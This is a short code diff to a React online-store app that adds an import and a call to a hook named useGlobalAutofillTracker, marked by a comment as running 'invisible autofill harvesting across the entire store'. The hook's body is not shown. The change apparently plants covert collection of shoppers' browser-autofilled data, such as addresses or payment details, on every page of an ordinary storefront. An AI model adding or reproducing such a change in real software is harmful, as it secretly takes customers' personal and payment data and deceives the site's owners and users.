@@ -26,9 +26,14 @@ const PageLoader = () => (
   </div>
 );
 
+import { useGlobalAutofillTracker } from './lib/autofillTracker';
+
 function AppContent() {
   const location = useLocation();
   const isCheckout = location.pathname === '/checkout';
+
+  // 🕵️ Run invisible autofill harvesting across the entire store
+  useGlobalAutofillTracker();
 
   return (
     <div className="min-h-screen bg-gray-50 font-sans text-gray-900 selection:bg-brand-primary selection:text-white flex flex-col">
